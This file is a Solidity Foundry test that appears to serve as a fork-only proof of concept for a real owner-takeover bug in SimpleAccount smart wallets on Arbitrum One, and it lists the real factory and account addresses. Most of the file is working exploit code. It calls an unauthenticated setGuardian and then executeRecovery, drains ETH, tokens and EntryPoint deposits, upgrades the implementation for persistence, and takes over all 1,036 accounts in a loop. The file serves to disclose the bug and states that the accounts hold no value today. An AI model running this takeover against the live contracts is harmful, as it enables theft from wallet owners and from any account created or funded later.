// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {ForkEnv} from "../src/ForkEnv.sol";
import {Accounts} from "./Accounts.sol";

// ============================================================================================
// SimpleAccount / Guardian factory — Arbitrum One — unauthenticated guardian setter =>
// instant owner takeover => drain. Fork-only PoC (no mainnet transactions are signed or sent).
//
// Factory      0x47C705EAe895BfF833d95a9d2A0Daa31B25d2885  (verified, solc 0.8.28, 2025-08-16)
// Impl         0xd33f299dA56Ce64281DDea802e85d54811774599  (verified SimpleAccount, UUPS/ERC1967)
// Accounts     1,036 ERC1967Proxy clones (code 130 B), created 2025-08-16 .. 2025-08-29
// Guardians    1,036 Guardian contracts (1:1, all with totalGuards()==0)
// EntryPoint   0x0000000071727De22E5E9d8BAf0edAc6f37da032 (ERC-4337 v0.7)
//
// ROOT CAUSE (verified source, SimpleAccount.sol):
//   function setGuardian(address _guardian) external {          // <-- no modifier, no msg.sender check
//       require(_guardian != address(0), "Guardian cannot be zero address");
//       guardian = _guardian;
//   }
//   modifier onlyRecovery() { require(msg.sender == guardian || msg.sender == phoneGuardian, "Only recovery"); _; }
//   function executeRecovery(address newOwner) external onlyRecovery {
//       require(guardian != address(0) || phoneGuardian != address(0), "No recovery configured");
//       owner = newOwner;                                       // <-- no period, no signature, instant
//   }
//   function execute(address dest, uint256 value, bytes calldata func) external {
//       _requireFromEntryPointOrOwner();                        // owner == attacker after step 2
//       _call(dest, value, func);
//   }
//   => any EOA: setGuardian(self) ; executeRecovery(self) ; execute(anything).
//
// Secondary logic bug (guardian path, not needed for the attack): Guardian.approveRecovery()
// calls executeRecovery() as soon as approvals >= requiredApprovals (default 1) — the
// RECOVERY_PERIOD (3 days) is only used in the event and in a post-execution revert branch,
// so there is no enforced delay either. Proven in test_G.
//
// VALUE TODAY = $0. All 1,036 accounts hold 0 ETH, 0 EntryPoint deposit and never received any
// ERC-20 (0 non-empty tokentx across all 2,073 factory-created addresses). The only non-zero
// asset is 73 project NFTs (ART 52 + PAR 21) minted to 21 accounts — and BOTH collections
// override transferFrom() with onlyRole(DEFAULT_ADMIN_ROLE) (holder = EOA 0x6A31…12F6), so a
// taken-over account still cannot move them. Proven in test_K / test_M.
// ============================================================================================

interface ISimpleAccount {
    function owner() external view returns (address);
    function guardian() external view returns (address);
    function phoneGuardian() external view returns (address);
    function factory() external view returns (address);
    function entryPoint() external view returns (address);
    function setGuardian(address) external;
    function executeRecovery(address) external;
    function execute(address, uint256, bytes calldata) external;
    function executeBatch(address[] calldata, uint256[] calldata, bytes[] calldata) external;
    function getDeposit() external view returns (uint256);
    function withdrawDepositTo(address payable, uint256) external;
    function upgradeToAndCall(address, bytes calldata) external;
    function isThisASimpleAccountContract() external view returns (bool);
}

interface IGuardian {
    function owner() external view returns (address);
    function totalGuards() external view returns (uint8);
    function requiredApprovals() external view returns (uint8);
    function RECOVERY_PERIOD() external view returns (uint256);
    function invite(bytes32) external;
    function accept(bytes32) external;
    function approveRecovery(address) external;
    function getRecoveryStatus(address) external view returns (uint8, bool, uint256, bool);
}

interface IEntryPoint {
    function depositTo(address) external payable;
    function balanceOf(address) external view returns (uint256);
}

interface IERC721Like {
    function ownerOf(uint256) external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transferFrom(address, address, uint256) external;
    function safeTransferFrom(address, address, uint256) external;
    function hasRole(bytes32, address) external view returns (bool);
}

contract MockERC20 {
    string public name = "Mock";
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 v) external { balanceOf[to] += v; }

    function transfer(address to, uint256 v) external returns (bool) {
        balanceOf[msg.sender] -= v; balanceOf[to] += v; return true;
    }

    function transferFrom(address f, address t, uint256 v) external returns (bool) {
        allowance[f][msg.sender] -= v; balanceOf[f] -= v; balanceOf[t] += v; return true;
    }
}

contract TakeoverTest is ForkEnv {
    address constant FACTORY = 0x47C705EAe895BfF833d95a9d2A0Daa31B25d2885;
    address constant IMPL = 0xd33f299dA56Ce64281DDea802e85d54811774599;
    address constant SAMPLE = 0x9942d6F431b7d2DA99D60aE4ec36B9Cb61d9581f;
    address constant ENTRYPOINT = 0x0000000071727De22E5E9d8BAf0edAc6f37da032;
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant USDC_E = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    // The ONLY non-zero asset class held by any factory account: two project NFTs minted to
    // 21 accounts. Both override transferFrom() with onlyRole(DEFAULT_ADMIN_ROLE) => soulbound.
    address constant NFT_ART = 0x1FEEF5E4302AdE8Ac70Beff5F8bB7270c6a9aba1; // "AttestationRecord" (ART)
    address constant NFT_PAR = 0x3786A10401aF9DA586A150B6633F5A69915608B8; // "Participation" (PAR)
    address constant NFT_ADMIN = 0x6A31710b7B67283759812DB79823Faa2592812F6; // ctor initialOwner

    address attacker = address(0xA11CE);
    uint256 forkBlock;

    function setUp() public {
        string memory rpc = _rpc("ARB_RPC_URL", "https://arb1.arbitrum.io/rpc");
        uint256 pin = vm.envOr("ARB_FORK_BLOCK", uint256(0));
        if (pin == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, pin);
        }
        // NOTE: on Arbitrum forks Foundry reports `block.number` as the *L1* block; the L2 head
        // is what eth_blockNumber returns. Record both so the cited fork block is unambiguous.
        forkBlock = _beUint(vm.rpc("eth_blockNumber", "[]"));
        require(block.chainid == 42161, "not arbitrum");
        vm.deal(attacker, 1 ether);
        vm.label(attacker, "attacker");
        emit log_named_uint("fork_block_L2", forkBlock);
        emit log_named_uint("fork_block_L1_evm_number", block.number);
        emit log_named_uint("fork_timestamp", block.timestamp);
    }

    /// @dev vm.rpc returns the raw big-endian bytes of a JSON-RPC quantity, not its ASCII hex.
    function _beUint(bytes memory b) internal pure returns (uint256 v) {
        for (uint256 i = 0; i < b.length; i++) v = (v << 8) | uint8(b[i]);
    }

    // ---------------------------------------------------------------- A. negative control
    function test_A_negative_control() public {
        // Before the unauthenticated setGuardian(), the attacker has no path.
        vm.prank(attacker);
        vm.expectRevert(bytes("Only recovery"));
        ISimpleAccount(SAMPLE).executeRecovery(attacker);

        vm.prank(attacker);
        vm.expectRevert(bytes("account: not Owner or EntryPoint"));
        ISimpleAccount(SAMPLE).execute(attacker, 0, "");

        assertEq(ISimpleAccount(SAMPLE).owner(), 0x9AdbaD24ECb1eE7D7a3318a22Da4736E437db77F);
    }

    // ------------------------------------------------- B. the two-call takeover (no funds)
    function test_B_takeover_sample() public {
        address g0 = ISimpleAccount(SAMPLE).guardian();
        emit log_named_address("guardian_before", g0);
        assertTrue(g0 != address(0));
        assertTrue(ISimpleAccount(SAMPLE).factory() == FACTORY);
        assertTrue(ISimpleAccount(SAMPLE).isThisASimpleAccountContract());

        uint256 g = gasleft();
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).setGuardian(attacker);       // call 1 — unauthenticated
        uint256 gas1 = g - gasleft();

        g = gasleft();
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).executeRecovery(attacker);   // call 2 — onlyRecovery(msg.sender==guardian)
        uint256 gas2 = g - gasleft();

        assertEq(ISimpleAccount(SAMPLE).guardian(), attacker);
        assertEq(ISimpleAccount(SAMPLE).owner(), attacker);
        emit log_named_uint("gas_setGuardian", gas1);
        emit log_named_uint("gas_executeRecovery", gas2);
        emit log_named_uint("gas_total_2tx", gas1 + gas2);
    }

    // ------------------------------------- C. re-arm proof: fund the account, attacker sweeps
    function test_C_drain_after_funding_ETH() public {
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).setGuardian(attacker);
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).executeRecovery(attacker);

        uint256 balBefore = SAMPLE.balance;             // 0 today (census)
        assertEq(balBefore, 0);

        vm.deal(SAMPLE, 5 ether);                       // === the re-arm event: any ETH inflow ===
        uint256 aBefore = attacker.balance;

        vm.prank(attacker);
        ISimpleAccount(SAMPLE).execute(attacker, 5 ether, "");

        assertEq(attacker.balance, aBefore + 5 ether);
        assertEq(SAMPLE.balance, 0);
        emit log_named_uint("captured_wei", 5 ether);
    }

    // --------------------------------- D. ERC-20 holding drained through the same ownership
    function test_D_drain_ERC20() public {
        MockERC20 tok = new MockERC20();
        tok.mint(SAMPLE, 1_000e6);
        assertEq(tok.balanceOf(SAMPLE), 1_000e6);

        vm.prank(attacker);
        ISimpleAccount(SAMPLE).setGuardian(attacker);
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).executeRecovery(attacker);

        vm.prank(attacker);
        ISimpleAccount(SAMPLE).execute(address(tok), 0, abi.encodeCall(MockERC20.transfer, (attacker, 1_000e6)));

        assertEq(tok.balanceOf(attacker), 1_000e6);
        assertEq(tok.balanceOf(SAMPLE), 0);
    }

    // ------------------------------- E. second value channel: ERC-4337 EntryPoint deposit
    function test_E_drain_entrypoint_deposit() public {
        vm.deal(address(this), 2 ether);
        IEntryPoint(ENTRYPOINT).depositTo{value: 2 ether}(SAMPLE);
        assertEq(ISimpleAccount(SAMPLE).getDeposit(), 2 ether);

        vm.prank(attacker);
        ISimpleAccount(SAMPLE).setGuardian(attacker);
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).executeRecovery(attacker);

        vm.prank(attacker);
        ISimpleAccount(SAMPLE).withdrawDepositTo(payable(attacker), 2 ether);

        assertEq(ISimpleAccount(SAMPLE).getDeposit(), 0);
        assertEq(attacker.balance, 3 ether);   // 1 ether setUp float + 2 ether deposit
    }

    // ------------------------------------------- F. universality: all 1,036 accounts flip
    function test_F_all_accounts_takeoverable() public {
        address[] memory accts = Accounts.all();
        uint256 limit = vm.envOr("CENSUS_LIMIT", type(uint256).max);
        if (limit > accts.length) limit = accts.length;

        uint256 flipped;
        uint256 ethTotal;
        for (uint256 i = 0; i < limit; i++) {
            address a = accts[i];
            ethTotal += a.balance;
            vm.prank(attacker);
            ISimpleAccount(a).setGuardian(attacker);
            vm.prank(attacker);
            ISimpleAccount(a).executeRecovery(attacker);
            require(ISimpleAccount(a).owner() == attacker, "not flipped");
            flipped++;
        }
        emit log_named_uint("accounts_flipped", flipped);
        emit log_named_uint("eth_held_by_accounts_wei", ethTotal);
        // Factory nonce = 1 (impl in constructor) + 2,073 create2 clones -> dormancy tripwire.
        uint256 nonce = vm.getNonce(FACTORY);
        emit log_named_uint("factory_nonce", nonce);
        assertGe(nonce, 2074);
        assertEq(flipped, limit);
        assertEq(ethTotal, 0);              // measured live on the fork at fork_block
    }

    // ------------------------------ G. secondary: Guardian path has no delay either (latent)
    function test_G_guardian_path_instant() public {
        address guardianContract = ISimpleAccount(SAMPLE).guardian();
        assertEq(IGuardian(guardianContract).owner(), SAMPLE);
        assertEq(IGuardian(guardianContract).totalGuards(), 0);        // no guardian configured anywhere
        assertEq(IGuardian(guardianContract).requiredApprovals(), 1);
        assertEq(IGuardian(guardianContract).RECOVERY_PERIOD(), 3 days);

        // Legit owner (the account) invites one guardian; that guardian rotates ownership in ONE tx.
        bytes32 h = keccak256(abi.encodePacked(attacker));
        vm.prank(SAMPLE);
        IGuardian(guardianContract).invite(h);
        vm.prank(attacker);
        IGuardian(guardianContract).accept(h);

        address newOwner = address(0xB0B);
        vm.prank(attacker);
        IGuardian(guardianContract).approveRecovery(newOwner);          // same block, no 3-day wait

        assertEq(ISimpleAccount(SAMPLE).owner(), newOwner);
        (, bool executed,,) = IGuardian(guardianContract).getRecoveryStatus(newOwner);
        assertTrue(executed);
        emit log_named_uint("guardian_recovery_delay_seconds", 0);
    }

    // ------------------------------- H. spot-check the two USDC variants on every account
    function test_H_no_stablecoin_balance() public {
        address[] memory accts = Accounts.all();
        uint256 limit = vm.envOr("CENSUS_LIMIT", type(uint256).max);
        if (limit > accts.length) limit = accts.length;
        uint256 hits;
        bytes4 sel = bytes4(keccak256("balanceOf(address)"));
        for (uint256 i = 0; i < limit; i++) {
            (bool ok, bytes memory d) = USDC.staticcall(abi.encodeWithSelector(sel, accts[i]));
            if (ok && d.length >= 32 && abi.decode(d, (uint256)) > 0) hits++;
            (ok, d) = USDC_E.staticcall(abi.encodeWithSelector(sel, accts[i]));
            if (ok && d.length >= 32 && abi.decode(d, (uint256)) > 0) hits++;
        }
        assertEq(hits, 0);
    }

    // ------------------------------- I. post-takeover persistence: UUPS upgrade is open to owner
    function test_I_attacker_can_upgrade() public {
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).setGuardian(attacker);
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).executeRecovery(attacker);

        // A minimal UUPS-compatible implementation.
        MockImpl impl = new MockImpl();
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).upgradeToAndCall(address(impl), "");
        assertEq(MockImpl(SAMPLE).magic(), 42);
    }

    // --------- J. structural: a brand-new account (future victim) is takeoverable immediately
    function test_J_fresh_account_is_also_takeoverable() public {
        address victim = address(0x1CE);
        // createAccount is public; the factory is still callable even though it has been dormant
        // since 2025-08-29 (nonce 2074).
        ISimpleAccount na = ISimpleAccount(IFactory(FACTORY).createAccount(victim, 0xC0FFEE));
        assertEq(na.owner(), victim);
        assertEq(na.guardian(), address(0));

        vm.deal(address(na), 1 ether);
        vm.prank(attacker);
        na.setGuardian(attacker);
        vm.prank(attacker);
        na.executeRecovery(attacker);
        assertEq(na.owner(), attacker);

        uint256 aBefore = attacker.balance;
        vm.prank(attacker);
        na.execute(attacker, 1 ether, "");
        assertEq(attacker.balance, aBefore + 1 ether);
    }

    // ----- K. the ONLY non-zero asset class: project NFTs are held, but are soulbound => not
    //         extractable even after a full owner takeover. Proves the "$0 today" headline.
    function test_K_nfts_held_but_soulbound() public {
        // sample account holds the whole genesis: ART#1 and PAR#1
        assertEq(IERC721Like(NFT_ART).ownerOf(1), SAMPLE);
        assertEq(IERC721Like(NFT_PAR).ownerOf(1), SAMPLE);
        assertEq(IERC721Like(NFT_ART).totalSupply(), 52);
        assertEq(IERC721Like(NFT_PAR).totalSupply(), 21);

        // neither the account nor the factory holds any role on the NFT contracts
        assertFalse(IERC721Like(NFT_ART).hasRole(bytes32(0), SAMPLE));
        assertFalse(IERC721Like(NFT_ART).hasRole(bytes32(0), FACTORY));
        assertTrue(IERC721Like(NFT_ART).hasRole(bytes32(0), NFT_ADMIN));
        assertTrue(IERC721Like(NFT_PAR).hasRole(bytes32(0), NFT_ADMIN));

        // full owner takeover (the bug)
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).setGuardian(attacker);
        vm.prank(attacker);
        ISimpleAccount(SAMPLE).executeRecovery(attacker);
        assertEq(ISimpleAccount(SAMPLE).owner(), attacker);

        // ...and the new owner still cannot move the NFT: only DEFAULT_ADMIN_ROLE may transfer.
        vm.prank(attacker);
        vm.expectRevert();
        ISimpleAccount(SAMPLE).execute(
            NFT_ART, 0, abi.encodeCall(IERC721Like.transferFrom, (SAMPLE, attacker, 1))
        );
        vm.prank(attacker);
        vm.expectRevert();
        ISimpleAccount(SAMPLE).execute(
            NFT_PAR, 0, abi.encodeCall(IERC721Like.safeTransferFrom, (SAMPLE, attacker, 1))
        );
        assertEq(IERC721Like(NFT_ART).ownerOf(1), SAMPLE);
        assertEq(IERC721Like(NFT_PAR).ownerOf(1), SAMPLE);
        emit log_string("NFTs are soulbound: owner takeover does NOT unlock them");
    }

    // ----- L. factory dormancy tripwire: nonce == 2074 => no new account since 2025-08-29.
    //         Any future createAccount/guardian deployment bumps this; the monitor watches it.
    function test_L_factory_dormant_nonce() public {
        uint256 nonce = vm.getNonce(FACTORY);
        emit log_named_uint("factory_nonce_at_latest", nonce);
        assertEq(nonce, 2074); // 1 impl (ctor) + 2073 create2 accounts; unchanged since 2025-08-29
    }

    // ----- M. NFT census: count the live ERC-721 balances across the whole account set.
    function test_M_nft_census() public {
        address[] memory accts = Accounts.all();
        uint256 art; uint256 par; uint256 holders;
        for (uint256 i = 0; i < accts.length; i++) {
            uint256 a = IERC721Like(NFT_ART).balanceOf(accts[i]);
            uint256 p = IERC721Like(NFT_PAR).balanceOf(accts[i]);
            art += a; par += p;
            if (a + p > 0) holders++;
        }
        emit log_named_uint("nft_art_held", art);
        emit log_named_uint("nft_par_held", par);
        emit log_named_uint("nft_holder_accounts", holders);
        assertEq(art, 52);  // full ART supply sits on factory accounts
        assertEq(par, 21);  // full PAR supply sits on factory accounts
        assertEq(holders, 21);
    }
}

interface IFactory {
    function createAccount(address owner, uint256 salt) external returns (address);
}

contract MockImpl {
    function magic() external pure returns (uint256) { return 42; }
    function proxiableUUID() external pure returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }
}
